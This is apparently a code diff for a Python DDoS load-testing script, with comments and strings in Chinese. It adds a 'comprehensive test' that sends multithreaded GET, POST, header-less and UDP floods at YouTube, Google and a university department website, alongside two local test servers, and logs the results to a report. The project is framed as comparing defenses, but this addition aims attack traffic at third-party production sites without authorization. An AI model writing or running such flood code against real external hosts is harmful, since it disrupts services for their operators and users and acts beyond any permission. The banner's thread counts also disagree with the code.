@@ -371,8 +371,8 @@ def progressive_test(target_url, attack_method, defense_enabled, protocol='HTTP/
     
     attacker = ProgressiveAttack(target_url, attack_method, protocol)
     
-    # 漸進式增加線程: 10~10000
-    thread_steps = [10, 100, 500, 1000, 1500, 2000, 5000, 10000]
+    # 漸進式增加線程
+    thread_steps = [10, 100, 500, 800]
     results = []
     
     for num_threads in thread_steps:
@@ -380,9 +380,9 @@ def progressive_test(target_url, attack_method, defense_enabled, protocol='HTTP/
         results.append(result)
         is_severe = print_result(result)
         
-        # 只有真正的性能卡頓才停止測試(延遲 > 15秒)
+        # 只有真正的性能卡頓才停止測試(延遲 > 10秒)
         # 如果只是防禦攔截,繼續測試
-        if is_severe and result['avg_response_time'] > 15.0:
+        if is_severe and result['avg_response_time'] > 10.0:
             print(f"\n⚠️  伺服器效能嚴重下降,停止增加線程")
             break
         
@@ -390,6 +390,150 @@ def progressive_test(target_url, attack_method, defense_enabled, protocol='HTTP/
     
     print(f"{'='*120}\n")
     return results
+
+def full_comprehensive_test():
+    """完整綜合測試 - 測試所有方法對 YouTube, Google 和本地伺服器"""
+    import datetime
+    import random
+    import os
+    
+    # 確保 report 目錄存在
+    report_dir = "../report"
+    if not os.path.exists(report_dir):
+        os.makedirs(report_dir)
+    
+    output_file = f"{report_dir}/ddos_test_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    
+    # 獲取本機IP
+    local_ip = get_local_ip()
+    
+    # 所有目標伺服器
+    targets = [
+        ("https://www.youtube.com", "YouTube"),
+        ("https://www.google.com", "Google"),
+        ("https://www.csie.nuk.edu.tw", "高大資工系"),
+        (f"http://{local_ip}:8000", "本地無防禦伺服器"),
+        (f"http://{local_ip}:8001", "本地有防禦伺服器")
+    ]
+    
+    # 隨機打亂伺服器順序
+    random.shuffle(targets)
+    
+    methods = [
+        ('GET', 'HTTP/1.1'),
+        ('POST', 'HTTP/1.1'),
+        ('NO_HEADERS', 'HTTP/1.1'),
+        ('UDP', 'UDP')
+    ]
+    
+    thread_steps = [10, 100, 500, 800]
+    
+    print("""
+    ╔══════════════════════════════════════════════════════════════════════════════╗
+    ║                     完整綜合 DDoS 測試 (伺服器隨機順序)                    ║
+    ║                                                                              ║
+    ║  目標: YouTube, Google, 高科大, 本地伺服器×2                               ║
+    ║  方法: GET, POST, NO_HEADERS, UDP                                           ║
+    ║  線程: 10, 800, 100, 500, 1000, 1200                                        ║
+    ║  輸出: TXT 報告檔案                                                         ║
+    ║  執行: 自動執行所有測試,無需按 Enter                                       ║
+    ╚══════════════════════════════════════════════════════════════════════════════╝
+    """)
+    
+    total_tests = len(targets) * len(methods) * len(thread_steps)
+    print(f"📊 伺服器數量: {len(targets)} (隨機順序)")
+    print(f"📊 每個伺服器測試: {len(methods)} 種方法 × {len(thread_steps)} 種線程 = {len(methods) * len(thread_steps)} 個測試")
+    print(f"📊 總測試數量: {total_tests}")
+    print(f"📝 報告將儲存至: {output_file}")
+    print(f"⏱️  預估時間: 約 {total_tests * 10 // 60} 分鐘\n")
+    
+    print("🔀 伺服器測試順序:")
+    for i, (url, name) in enumerate(targets, 1):
+        print(f"   {i}. {name}")
+    print()
+    
+    with open(output_file, 'w', encoding='utf-8') as f:
+        f.write("="*120 + "\n")
+        f.write("DDoS 攻擊測試完整報告 (伺服器隨機順序)\n")
+        f.write(f"測試時間: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"伺服器數量: {len(targets)}\n")
+        f.write(f"測試總數: {total_tests}\n")
+        f.write(f"線程配置: {thread_steps}\n")
+        f.write("="*120 + "\n\n")
+        
+        f.write("伺服器測試順序:\n")
+        for i, (url, name) in enumerate(targets, 1):
+            f.write(f"  {i}. {name} ({url})\n")
+        f.write("\n" + "="*120 + "\n\n")
+        
+        test_counter = 0
+        
+        # 按伺服器順序測試
+        for server_idx, (url, name) in enumerate(targets, 1):
+            print(f"\n{'='*120}")
+            print(f"🎯 伺服器 [{server_idx}/{len(targets)}]: {name}")
+            print(f"{'='*120}\n")
+            
+            f.write("\n" + "="*120 + "\n")
+            f.write(f"伺服器 {server_idx}/{len(targets)}: {name} ({url})\n")
+            f.write("="*120 + "\n\n")
+            
+            # 對每個伺服器執行所有方法和線程組合
+            for method, protocol in methods:
+                print(f"\n📡 方法: {method} ({protocol})")
+                print(f"{'='*100}")
+                
+                f.write(f"\n方法: {method} ({protocol})\n")
+                f.write("-"*120 + "\n")
+                
+                attacker = ProgressiveAttack(url, method, protocol)
+                
+                for num_threads in thread_steps:
+                    test_counter += 1
+                    print(f"  線程: {num_threads:4d} | 進度: [{test_counter}/{total_tests}] ", end='', flush=True)
+                    
+                    try:
+                        result = attacker.test_with_threads(num_threads, duration=8)
+                        
+                        # 組合結果行
+                        line = (f"成功: {result['success']:4d} | "
+                               f"失敗: {result['failed']:4d} | "
+                               f"成功率: {result['success_rate']:5.1f}% | "
+                               f"延遲: {result['avg_response_time']*1000:6.1f}ms | "
+                               f"速率: {result['request_rate']:6.1f} req/s | "
+                               f"Ports: {result['unique_ports']:3d}")
+                        
+                        if result.get('udp_packets', 0) > 0:
+                            line += f" | UDP: {result['udp_packets']}"
+                        
+                        print(f"| {line}")
+                        
+                        f.write(f"  線程: {num_threads:4d} | {line}\n")
+                        
+                        # 重置統計
+                        attacker.reset_stats()
+                        
+                    except Exception as e:
+                        error_msg = f"❌ 失敗: {str(e)}"
+                        print(f"| {error_msg}")
+                        f.write(f"  線程: {num_threads:4d} | {error_msg}\n")
+                    
+                    time.sleep(1)
+                
+                print()
+            
+            print(f"\n✅ {name} 測試完成\n")
+            f.write(f"\n{name} 測試完成\n")
+            f.write("="*120 + "\n\n")
+        
+        f.write("\n" + "="*120 + "\n")
+        f.write("所有測試完成\n")
+        f.write("="*120 + "\n")
+    
+    print(f"\n{'='*120}")
+    print(f"✅ 所有測試完成! 報告已儲存至: {output_file}")
+    print(f"{'='*120}\n")
+    return output_file
 
 def compare_defense_effectiveness():
     """比較有無防禦的效果"""
@@ -422,7 +566,11 @@ def compare_defense_effectiveness():
     print("  4. 每個請求使用不同 source port")
     print("  5. 支援 UDP/QUIC 流量統計")
     
-    choice = input("\n選擇測試模式:\n  [1] 完整對比測試 (需要同時啟動2個伺服器)\n  [2] 僅測試單一伺服器\n請選擇: ")
+    choice = input("\n選擇測試模式:\n  [1] 完整對比測試 (需要同時啟動2個伺服器)\n  [2] 僅測試單一伺服器\n  [3] 完整綜合測試 (YouTube & Google 所有方法)\n請選擇: ")
+    
+    if choice == '3':
+        full_comprehensive_test()
+        return
     
     if choice == '1':
         print("\n" + "="*100)
